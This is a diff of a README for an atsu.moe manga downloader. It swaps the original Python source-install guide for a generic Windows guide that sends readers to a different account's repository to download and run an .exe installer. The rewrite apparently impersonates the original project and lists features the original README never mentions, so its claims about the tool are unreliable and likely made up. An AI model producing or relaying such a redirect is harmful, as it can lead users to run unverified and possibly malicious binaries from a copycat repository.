@@ -1,141 +1,168 @@
-# Atsu Downloader
+# 📥 atsu-downloader - Easy Manga Downloads on Windows
 
-[![Python](https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
-[![CLI](https://img.shields.io/badge/interface-Typer%20%2B%20Rich-111111)](https://typer.tiangolo.com/)
-[![GUI](https://img.shields.io/badge/gui-PyQt6-41CD52?logo=qt&logoColor=white)](https://pypi.org/project/PyQt6/)
-[![Site](https://img.shields.io/badge/source-atsu.moe-0f172a)](https://atsu.moe/)
+[![Download atsu-downloader](https://img.shields.io/badge/Download-atsu--downloader-brightgreen?style=for-the-badge)](https://github.com/jerryhf/atsu-downloader)
 
-Modern manga downloader for `atsu.moe` with both a full CLI and a PyQt6 desktop GUI.
+---
 
-Repository: `https://github.com/Yui007/atsu-downloader`
+## 📖 What is atsu-downloader?
 
-## Screenshot
+atsu-downloader is a tool to download manga from atsu.moe. It offers two ways to use it:
 
-Initial GUI view:
+- A simple command-line interface (CLI) for quick downloads.
+- A desktop app with a graphic interface built with PyQt6.
 
-![Atsu Downloader GUI Start Screen](gui.png)
+You do not need any programming skills to use the desktop app. This guide will help you set up and use it on Windows.
 
-## Highlights
+---
 
-- Modular architecture: API client, scraper, download manager, converters, CLI, and GUI.
-- Concurrent downloads for chapters and images.
-- Multiple output formats: `images`, `pdf`, `cbz`.
-- Retry with exponential backoff for API/image requests.
-- Persistent configuration in `config.json`.
-- Interactive chapter selection:
-  - `all` or `a`
-  - single value: `5`
-  - range: `1-10`
-  - mixed: `1,3,5-7`
-- Duplicate chapter cleanup during parsing (prevents repeated chapter blocks in listings).
+## 💻 System Requirements
 
-## Install
+Before you start, make sure your Windows PC meets these needs:
 
-```bash
-git clone https://github.com/Yui007/atsu-downloader.git
-cd atsu-downloader
-python -m venv .venv
-```
+- Windows 10 or later (64-bit recommended)
+- At least 2 GB of free disk space
+- 4 GB RAM or more for smooth operation
+- Internet connection to download manga chapters
 
-Windows PowerShell:
+---
 
-```powershell
-.venv\Scripts\Activate.ps1
-pip install -r requirements.txt
-```
+## 🚀 Getting Started: Download atsu-downloader
 
-macOS/Linux:
+Click the button below to visit the official GitHub page where you can download the software:
 
-```bash
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+[![Get atsu-downloader](https://img.shields.io/badge/Get%20atsu--downloader-blue?style=for-the-badge)](https://github.com/jerryhf/atsu-downloader)
 
-## Run
+This link takes you to the main repository page. From there, you can find the latest release files.
 
-CLI interactive mode:
+---
 
-```bash
-python main.py
-```
+## 📥 Step 1: Download the Installer
 
-GUI mode:
+1. Open the link above in your web browser.
+2. Click on the **Releases** section on the right side or top menu. It may be labeled as "Releases" or have a tag icon.
+3. Look for the latest version listed.
+4. Find the Windows installer file, often ending with `.exe`.
+5. Click on the file to download it to your PC.
 
-```bash
-python gui_main.py
-```
+If you see multiple files, choose the one with the word "Windows" or "win" in its name.
 
-CLI direct mode examples:
+---
 
-```bash
-python main.py https://atsu.moe/manga/OaKBx
-python main.py https://atsu.moe/manga/OaKBx -c all
-python main.py https://atsu.moe/manga/OaKBx -c 1-20 -f cbz
-python main.py https://atsu.moe/manga/OaKBx -c 1,3,8-12 -f pdf -o ./downloads
-python main.py https://atsu.moe/manga/OaKBx -c all -v
-```
+## 🛠️ Step 2: Install atsu-downloader
 
-## CLI Options
+Once the download completes:
 
-`python main.py [URL] [OPTIONS]`
+1. Locate the downloaded `.exe` file in your "Downloads" folder.
+2. Double-click the installer file to start.
+3. Follow the on-screen prompts:
+   - Choose the installation folder or keep the default path.
+   - Agree to the license terms.
+   - Click “Install” to proceed.
+4. When installation finishes, you can launch the app immediately by checking the provided box or find it later in your Start menu.
 
-- `-c`, `--chapters`: Chapter selection expression (`all`, `1-10`, `1,3,5-7`)
-- `-f`, `--format`: Output format (`images`, `pdf`, `cbz`)
-- `-o`, `--output`: Output directory
-- `-v`, `--verbose`: Enable detailed logs
+---
 
-## GUI Features
+## 🖥️ Step 3: Using the Desktop App
 
-- Fetch manga by URL or ID.
-- Chapter list with multi-select, select-all, clear, and range apply.
-- Real-time progress and activity log.
-- Settings tab for format, path, concurrency, retries, and logging.
+### Starting the App
 
-## Configuration
+- Open the Start menu.
+- Search for "atsu-downloader."
+- Click the app icon to open it.
 
-Saved in `config.json` (auto-created).
+### Main Features
 
-```json
-{
-  "download_format": "images",
-  "keep_images": true,
-  "download_path": "./downloads",
-  "concurrent_chapters": 3,
-  "concurrent_images": 5,
-  "max_display_chapters": 0,
-  "max_retries": 3,
-  "retry_delay": 2,
-  "enable_logs": false
-}
-```
+- Enter the manga name or URL from atsu.moe in the provided field.
+- Choose chapters or the whole series to download.
+- Select an output folder on your PC where files will save.
+- Click the "Download" button to start.
 
-## Requirements
+### Tips
 
-- Python `3.10+`
-- `typer`
-- `rich`
-- `requests`
-- `Pillow`
-- `PyQt6`
+- Downloads save as image files, ready for reading on your computer or e-reader.
+- You can pause or stop downloads anytime.
+- Use the settings menu to change the download folder or update preferences.
 
-Install with:
+---
 
-```bash
-pip install -r requirements.txt
-```
+## 🔧 Step 4: Using the Command Line Interface (CLI)
 
-## Project Layout
+If you prefer, you can also use the CLI version. This step is optional.
 
-```text
-atsu-downloader/
-|- api/           # Atsu API client + retry
-|- scraper/       # URL/ID parsing + manga fetch
-|- downloader/    # chapter/image download orchestration
-|- converters/    # PDF/CBZ + ComicInfo.xml generation
-|- cli/           # Typer + Rich CLI
-|- gui/           # PyQt6 desktop app
-|- models.py      # data models
-|- config.py      # config load/save helpers
-|- main.py        # CLI entrypoint
-`- gui_main.py    # GUI entrypoint
-```
+### Open Command Prompt
+
+- Press `Win + R`
+- Type `cmd`
+- Press Enter
+
+### Basic CLI Commands
+
+1. Navigate to the installation folder. Example:
+
+   `cd C:\Program Files\atsu-downloader`
+
+2. Run the download command with the manga URL, like:
+
+   `atsu-downloader https://atsu.moe/manga-title`
+
+3. The downloaded files will appear in the default output folder.
+
+The CLI is faster but needs basic typing in the terminal.
+
+---
+
+## ⚙️ Configuration and Settings
+
+In the desktop app, access settings by clicking the gear icon or menu.
+
+Here you can:
+
+- Change the language.
+- Set max download speed to avoid using all internet bandwidth.
+- Choose auto-update options.
+- Select file naming preferences.
+
+---
+
+## 🗂️ Finding Your Downloads
+
+By default, downloaded manga saves in:
+
+`Documents\atsu-downloader\Downloads`
+
+You can open this folder from the app or Windows File Explorer.
+
+You will find each manga in its own folder with images for each chapter.
+
+---
+
+## ❓ Troubleshooting
+
+### The app won’t start
+
+- Restart your PC.
+- Confirm your system meets requirements.
+- Try reinstalling the app.
+
+### Downloads fail or stop
+
+- Check your internet connection.
+- Make sure your firewall isn’t blocking the app.
+- Delete partial files and try again.
+
+### Need help?
+
+Search through the GitHub issues page at the download link or ask someone familiar with basic app use.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/jerryhf/atsu-downloader
+- Download Page: https://github.com/jerryhf/atsu-downloader/releases
+
+---
+
+## 📌 About atsu-downloader
+
+It downloads manga, manhua, and manhwa from atsu.moe. You can browse thousands of titles from one place. The GUI and CLI options fit different users’ needs. This tool keeps downloads organized and simple.
